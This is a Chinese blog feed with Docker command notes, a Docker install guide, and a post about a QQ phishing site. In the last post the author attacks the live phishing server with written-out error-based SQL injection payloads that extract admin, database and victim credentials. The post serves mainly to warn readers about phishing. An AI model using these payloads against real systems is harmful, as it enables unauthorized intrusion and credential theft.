:设置/dev/shm的大小，默认值是64M；</span><br><span class="line">--tag, -t: 镜像的名字及标签，通常name:tag或者name格式；可以在一次构建中为一个镜像设置多个标签。</span><br><span class="line">--network: 默认 default。在构建期间设置RUN指令的网络模式</span><br></pre></td></tr></table></figure><p>使用当前目录的Dockerfile创建镜像，标签为”ctf-sqli:1”，注意后面的”.”千万不能丢。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost docker-for-web]# docker build -t ctf-sqli:1 .</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g578lgzjkmj30zb0dfjsq.jpg" alt><br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g578pwytfij30u7023t8o.jpg" alt><br>2.docker images<br>通过docker images命令可以列出主机上的镜像，默认只列出最顶层的镜像，可以使用-a选项显示出所有镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker images [OPTIONS] [REPOSITORY[:TAG]]</span><br><span class="line"></span><br><span class="line">-a :列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）</span><br><span class="line">--digests :显示镜像的摘要信息</span><br><span class="line">-f :显示满足条件的镜像</span><br><span class="line">--format :指定返回值的模板文件</span><br><span class="line">--no-trunc :显示完整的镜像信息</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker images -a</span><br></pre></td></tr></table></figure><p><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g578ulrp4uj30t60bgabd.jpg" alt="images"><br>3.docker rmi<br>docker rmi命令用于删除镜像，删除镜像时，如果已有基于该镜像启动的容器存在，则无法直接删除，需要先用rm命令删除容器。这两个子命令都提供 -f 选项，可强制删除存在容器的镜像或启动中的容器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker rmi [OPTIONS] IMAGE [IMAGE...]</span><br><span class="line"></span><br><span class="line">-f：强制删除</span><br><span class="line">--no-prune：不移除该镜像的过程镜像，默认移除</span><br></pre></td></tr></table></figure><p>示例 删除ubuntu:16.04镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker rmi ubuntu:16.04</span><br><span class="line">Untagged: ubuntu:16.04</span><br><span class="line">Untagged: ubuntu@sha256:58d0da8bc2f434983c6ca4713b08be00ff5586eb5cdff47bcde4b2e88fd40f88</span><br><span class="line">Deleted: sha256:9361ce633ff193349d54bed380a5afe86043b09fd6ea8da7549dbbedfc2a7077</span><br><span class="line">Deleted: sha256:59a6856f439d187f3ce3381d0a6b0816db99cc3d8468bcf8c9d1c39d2071dcff</span><br><span class="line">Deleted: sha256:82997a16a0d57ac7d8b416c0d83f5841193b6a56a7844b486ab6324730867fe0</span><br><span class="line">Deleted: sha256:5c6983f277f26021b5e38501fdf06fa29f7158a93641f3f10aedbdc9869121d0</span><br><span class="line">Deleted: sha256:aa54c2bc12290df2851a94b8834cae75e4627219d2b423d4d3db8b0a497e79a2</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5796gp9ibj30vs05f3z3.jpg" alt="rmi"><br>4.docker save<br>将指定镜像保存成tar归档文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker save [OPTIONS] IMAGE [IMAGE...]</span><br><span class="line"></span><br><span class="line">-o :输出到的文件</span><br></pre></td></tr></table></figure><p>示例 将nginx:latest镜像归档为tar文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker save -o nginx.tar nginx:latest</span><br><span class="line">[root@localhost ~]# ls</span><br><span class="line">nginx.tar</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g579deswgfj30oz020a9z.jpg" alt="save"><br>5.docker load<br>导入使用docker save命令导出的镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker load [OPTIONS]</span><br><span class="line"></span><br><span class="line">-i :指定导出的文件</span><br><span class="line">-q :精简输出信息</span><br></pre></td></tr></table></figure><p>示例 导入nginx:latest镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker load -i nginx.tar</span><br><span class="line">Loaded image: nginx:latest</span><br><span class="line">[root@localhost ~]# docker images nginx:latest</span><br><span class="line">REPOSITORYTAG IMAGE IDCREATED SIZE</span><br><span class="line">nginx latest98ebf73aba753 days ago109MB</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g579oibvjej30sw04v3ys.jpg" alt="load"><br>6.docker commit<br>docker commit命令可以将一个容器固化为一个新的镜像。当需要制定特定的镜像时，会进行修改容器的配置，比如在容器中安装一些特定的工具等，通过commit命令可以将这些修改保存起来，使其不会因为容器的停止而丢失</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</span><br><span class="line"></span><br><span class="line">-a :提交的镜像作者</span><br><span class="line">-c :使用Dockerfile指令来创建镜像</span><br><span class="line">-m :提交时的说明文字</span><br><span class="line">-p :在commit时，将容器暂停</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker commit -a &quot;Linuz&quot; 66d682605023 ubuntu:linuz</span><br><span class="line">sha256:5e0162d1e4e9d04a37c3c10b052d435555f3961e029735ed07c96d66c6a6e608</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g57a9tfc4kj30zj07e0td.jpg" alt="commit"><br><strong>后面的命令将在下一篇文中继续总结</strong><br><strong>部分命令参考来自菜鸟教程(<a href="https://www.runoob.com/docker/docker-command-manual.html" target="_blank" rel="noopener">传送门</a>)</strong></p>]]></content>
      
      
      <categories>
          
          <category> 虚拟化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker学习笔记(1)</title>
      <link href="/2019/07/20/Docker-1/"/>
      <url>/2019/07/20/Docker-1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学习了Docker，深感Docker的强大，对Docker常用的子命令做了一下整理，共涉及6类，32个子命令。当然我整理的并不全面，有什么疏漏和错误还请大家指出。像Docker的镜像，仓库，容器等一些概念这里不介绍，网上随便一搜都是写的非常好的精华文。<br><em>七月的夏天很热，听着窗外难得的下雨声，淅淅沥沥…</em><br><strong>回到正题</strong><br>如何安装Docker?请参考上一篇文章(<a href="https://linuz.me/2019/07/19/Docker-install">传送门</a>)<br>总结到了一张脑图上，可以做个参考，<a href="https://edrawcloudpubliccn.oss-cn-shenzhen.aliyuncs.com/viewer/self/985122/share/2019-7-20/1563615986/main.svg" target="_blank" rel="noopener">查看高清版请点我</a><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g56g4mmkc1j30wv0u01kx.jpg" alt>  </p><h1 id="Docker环境信息"><a href="#Docker环境信息" class="headerlink" title="Docker环境信息"></a>Docker环境信息</h1><p>1.docker info<br>显示Docker系统信息，包括镜像和容器数<br>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g56bd5i9uij30qs04odfv.jpg" alt="info"><br>2.docker version<br>显示Docker版本信息<br>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><p><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g56bg285jlj30rh0c0t9a.jpg" alt="version"></p><h1 id="容器生命周期管理"><a href="#容器生命周期管理" class="headerlink" title="容器生命周期管理"></a>容器生命周期管理</h1><p>1.docker run<br>创建一个新的容器并运行一个命令  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run [options] IMAGE [COMMAND] [ARG...]</span><br></pre></td></tr></table></figure><p>部分常用选项  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-i选项表示使用交互模式，始终保持输入流开放</span><br><span class="line">-t选项表示分配一个伪终端，一般两个参数结合时使用-it，即可在容器中利用打开的伪终端进行交互操作</span><br><span class="line">-d选项: 后台运行容器，并返回容器ID</span><br><span class="line">--name选项可以指定docker run命令启动的容器名字，若无此选项，Docker将为容器随机分配一个名字</span><br><span class="line">-c选项：用于给运行在容器中的所有进程分配CPU的shares值，这是一个相对权重，实际的处理速度还与宿主机的CPU相关</span><br><span class="line">-m选项：用于限制为容器中所有进程分配的内存总量，以B、K、M、G为单位</span><br><span class="line">-v选项：用于挂载一个volume，可以用多个-v参数同时挂载多个volume。volume的格式为[host-dir]:[container-dir]:[rw|ro]</span><br><span class="line">-p选项：用于将容器内部端口映射给宿主机的端口，其常见格式为：主机(宿主)端口:容器内部端口</span><br><span class="line">-P选项：随机端口映射，容器内部端口随机映射到宿主机的端口</span><br></pre></td></tr></table></figure><p>示例1 运行ubuntu容器，并分配一个伪终端：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run -it ubuntu:latest /bin/bash</span><br><span class="line">root@6bf6f0202075:/#</span><br></pre></td></tr></table></figure><p><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g56bq5sf3sj30qd01q3ye.jpg" alt="run1"><br>示例2 后台运行ubuntu容器，并返回该容器ID：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run -i -d ubuntu:latest</span><br><span class="line">9f4b85a405e9d655c8f57c04275d771d36e9908afc4b1e04598b54e676407d36</span><br></pre></td></tr></table></figure><p><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g56cdargj6j30s101ea9z.jpg" alt="run2"><br>2.docker start<br>启动一个或多个已经被停止的容器  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start [OPTIONS] CONTAINER [CONTAINER...]</span><br></pre></td></tr></table></figure><p>示例：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker start 9f4b85a405e9</span><br><span class="line">9f4b85a405e9</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g56ctoavcgj30x9044t8v.jpg" alt="start"><br>3.docker stop<br>停止一个运行中的容器  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop [OPTIONS] CONTAINER [CONTAINER...]</span><br></pre></td></tr></table></figure><p>示例：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker stop 9f4b85a405e9</span><br><span class="line">9f4b85a405e9</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g56d20znqfj30zj04taaa.jpg" alt="stop"><br>4.docker restart<br>重启容器  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart [OPTIONS] CONTAINER [CONTAINER...]</span><br></pre></td></tr></table></figure><p>示例：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker restart 9f4b85a405e9</span><br><span class="line">9f4b85a405e9</span><br></pre></td></tr></table></figure><p><img src="https://tva3.sinaimg.cn/large/007DFXDhly1g56d57ohnhj30xa0423yo.jpg" alt="restart"><br>5.docker rm<br>删除一个或多少容器  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker rm [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line"></span><br><span class="line">-f :通过SIGKILL信号强制删除一个运行中的容器</span><br><span class="line">-l :移除容器间的网络连接，而非容器本身</span><br><span class="line">-v :-v 删除与容器关联的卷</span><br></pre></td></tr></table></figure><p>示例：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker rm -f 5198ec963e43</span><br><span class="line">5198ec963e43</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g59kjusjjhj30ny01e745.jpg" alt="rm"><br>6.docker kill<br>kill命令的作用是杀掉一个运行中的容器  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker kill [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">-s :向容器发送一个信号</span><br></pre></td></tr></table></figure><p>示例：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker kill -s kill 9f4b85a405e9</span><br><span class="line">9f4b85a405e9</span><br></pre></td></tr></table></figure><p><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g56ddwugqrj310304vjrm.jpg" alt="kill"><br><strong>PS.一些常见的rm和kill组合姿势~</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">杀死所有正在运行的容器</span><br><span class="line">docker kill $(docker ps -a -q)</span><br><span class="line"></span><br><span class="line">删除所有已经停止的容器</span><br><span class="line">docker rm $(docker ps -a -q)</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g59kp89w1gj317v0jhmz3.jpg" alt="rm&amp;kill"><br>7.docker exec<br>docker exec命令比较常用，他的作用是在运行的容器中执行命令  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker exec [OPTIONS] CONTAINER COMMAND [ARG...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-d :分离模式: 在后台运行</span><br><span class="line">-i :即使没有附加也保持STDIN 打开</span><br><span class="line">-t :分配一个伪终端</span><br></pre></td></tr></table></figure><p>示例：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker exec -it 9f4b85a405e9 /bin/bash</span><br><span class="line">root@9f4b85a405e9:/#</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g56dlsy3z5j30qo01nt8m.jpg" alt="exec"><br><strong>后面的命令将在下一篇文中继续总结</strong><br><strong>部分命令参考来自菜鸟教程(<a href="https://www.runoob.com/docker/docker-command-manual.html" target="_blank" rel="noopener">传送门</a>)</strong>  </p>]]></content>
      
      
      <categories>
          
          <category> 虚拟化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker安装指南</title>
      <link href="/2019/07/19/Docker-install/"/>
      <url>/2019/07/19/Docker-install/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很久以前就对Docker了解一些，但是一直没用过，所以也没接触到，前一段时间必须要用Docker做一些东西，接触了才深感Docker的强大！本来没想写Docker的安装这种教程，毕竟比较简单，而且网上有很多详细的教程，即使安装出错百度一下也能找到对应的解决方法，然而最近想记录一下关于学习Docker系列的笔记，所以由浅入深，就先把安装步骤写了吧。此次选择了两个系统进行安装，一个是Centos 7一个是Ubuntu 16.04，并未涉及Windows和OS X系统，如有需求可以百度查阅相关资料。  </p><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul><li>64位CPU架构的计算机。  </li><li>建议系统的Linux内核版本在3.10及以上。  </li></ul><p>查看Linux内核版本  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# uname -r</span><br><span class="line">3.10.0-957.el7.x86_64</span><br></pre></td></tr></table></figure><h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><h2 id="Centos-7安装Docker"><a href="#Centos-7安装Docker" class="headerlink" title="Centos 7安装Docker"></a>Centos 7安装Docker</h2><p>1.首先安装所需的软件包  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2 bind-utils</span><br></pre></td></tr></table></figure><p>2.设置yum源  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>3.查看仓库中所有可安装的docker版本，你可以根据需求来选择指定版本安装  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum list docker-ce --showduplicates | sort -r</span><br></pre></td></tr></table></figure><p>4.安装最新版Docker-ce  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum -y install docker-ce</span><br></pre></td></tr></table></figure><p>5.启动Docker并加入开机自启动  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></table></figure><p>6.验证Docker是否成功安装  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker version</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhly1g560kbpm2vj30rc0cr3z7.jpg" alt="安装成功"></p><h2 id="Ubuntu-16-04安装Docker"><a href="#Ubuntu-16-04安装Docker" class="headerlink" title="Ubuntu 16.04安装Docker"></a>Ubuntu 16.04安装Docker</h2><p>1.先卸载可能存在的旧版本  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker-ce docker.io</span><br></pre></td></tr></table></figure><p>2.更新软件源中的所有软件列表  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>3.安装以下包以使apt可以通过HTTPS使用存储库(repository)  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure><p>4.添加Docker官方的GPG密钥  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>5.设置stable存储库  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br></pre></td></tr></table></figure><p>6.再次更新软件源中的所有软件列表  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>7.安装最新版Docker-ce  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y docker-ce</span><br></pre></td></tr></table></figure><p>8.查看docker服务是否启动  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g561247nz6j30kc05i0tl.jpg" alt="成功启动"><br>如果未启动，启动docker服务  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><p>9.验证Docker是否安装成功  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker version</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5616rqom2j30k708zt9s.jpg" alt="安装成功"><br><strong>部分参考来源于网络，<a href="https://blog.csdn.net/jinking01/article/details/82490688" target="_blank" rel="noopener">参考链接</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 虚拟化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你的QQ就是这样被盗的|防范网络钓鱼</title>
      <link href="/2019/07/08/Phishing-site/"/>
      <url>/2019/07/08/Phishing-site/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前在qq上就收到过朋友发来的二维码链接啥的，一般的套路就是诱导你扫描这个二维码或者点击这个链接。<br>例如某天爱玩吃鸡的你收到一条链接，标题是点击领取金币领皮肤领…然后你兴奋的不行，点开之后让你输入账号密码登录，你看着这个页面，没有发现半点可疑的地方，然后就把账号密码随手输了进去。不一会儿，你的qq提示在其他地方登录，然后你列表的好友就都收到了你发给他们的链接。又比如某天，你收到一条消息/一条空间留言，内容是：这个人的qq空间里怎么有你的照片？又或者是：这个人是谁？为什么他空间有你俩的合影？单纯善良好奇心又巨强的你瞬间懵了，同学？我和谁合过影啊？都忘了，赶紧去看看。但是你点击以后是个qq空间的页面让你登录，合情合理啊，毕竟是qq空间相册，那就登录呗，然后你qq就掉线了。<br>本文没啥技术含量，因为这几天正好碰到一个钓鱼网站，结合着真实的钓鱼网站打算给朋友们科普一下，提高一下防范意识。  </p><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>某个无聊的下午，正吃着西瓜刷着微博，突然收到一条QQ消息，吓得我赶紧放下了手中的西瓜…<br>是一个朋友发来的消息，内容如下：<br><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g4s5b20ueqj30jg0e8myh.jpg" alt><br>那就扫一下呗，二维码直接拿到电脑上扫了一下，得到一个短网址<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4s5q096gwj30rl0agdft.jpg" alt><br>还原短网址得到一个链接<br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4s5qutvsdj31520fedg5.jpg" alt><br>然后我们直接访问这个链接，会先出现一个电脑管家安全检测的页面，最终会跳转到真实钓鱼网站的页面。不得不说，这个安全检测过程做的还有模有样的，这个过程会让人们更容易相信这是一个安全的网站，减少顾虑，从而增加成功的概率。(如果在手机qq里面长按二维码识别，然后跳转到钓鱼网站页面的过程是看不到网站域名的，最终只有一个qq空间登录页面。)<br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4s6gdq47vj321n0u0di8.jpg" alt><br>正常情况下，输入qq号码和密码后跳转到QQ空间黄钻活动页面。<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4s6qqeplqj31hc0scab4.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4sjxauxykj31hc0scjtb.jpg" alt>  </p><h1 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h1><p>前两天在FreeBuf上看到一个大佬对这类钓鱼网站的源码做了代码审计(<a href="https://www.freebuf.com/column/207162.html" target="_blank" rel="noopener">传送门</a>)，正好拿这个网站练练手。无奈管理员登录界面根本找不到，猜了半天，最终发现有一个“后台”拼音缩写的目录，但是访问也跳转不到管理地址，又扫了一下，无果，遂放弃。<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4s73og3yjj31040eaglv.jpg" alt>  </p><h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><p>在对传递参数进行测试的过程中，发现密码输入框处存在SQL注入漏洞。<br>正常输入：<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4s7ep27jfj30xr0d8t9w.jpg" alt><br>传递单引号报错：<br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4sk6lanbmj31fv0jhgn3.jpg" alt><br>此处的查询语句应该是  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from qq where username=&apos;xxx&apos; and password=&apos;xxx&apos;;</span><br></pre></td></tr></table></figure><p>本来以为是Sqlmap一把梭的那种，结果跑一下就被waf封IP，那就手工呗。<br>报错注入，已知表名是qq，字段名是username,password<br>获取数据库名：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#</span><br></pre></td></tr></table></figure><p><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g4uimkq8yvj31bx0e675r.jpg" alt><br>数据库名字为’db’，猜测管理员表名为admin，字段名同上  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (extractvalue(1,concat(0x7e,(select username from db.admin),0x7e)))#</span><br></pre></td></tr></table></figure><p>由于extractvalue()这几种报错注入的方法最多显示32位，所以可以用substring()分割一下  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (extractvalue(1,concat(0x7e,(substring((select password from db.admin),1,16 )),0x7e)))#</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4s865t25rj31es0frjsx.jpg" alt><br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4s8vui48sj31gc0cemyq.jpg" alt><br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4s8wmfu6qj31gf0c875u.jpg" alt><br>拿数据库的密码时用了另外一种方法  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (select 1 from (select count(*),concat(&apos;~&apos;,(select Password from mysql.user where host=&apos;127.0.0.1&apos; limit 0,1),&apos;~&apos;,floor(rand(0)*2)) as a from information_schema.tables group by a)b)#</span><br></pre></td></tr></table></figure><p><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g4s929b50aj31ge0dsjt7.jpg" alt><br>查受害者的账号密码  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (extractvalue(1,concat(0x7e,(select username from db.qq where id=1),0x7e,(select password from db.qq where id=1),0x7e)))#</span><br></pre></td></tr></table></figure><p><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g4s96egdw7j31gf0e675z.jpg" alt><br>本来还想试试load_file()读个配置文件啥的，后来发现是高版本的mysql，凉凉~  </p><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>你还想看后续？？？你们有啥想法和思路倒是可以交流一下~比如什么给他提交10万条假数据一类的…  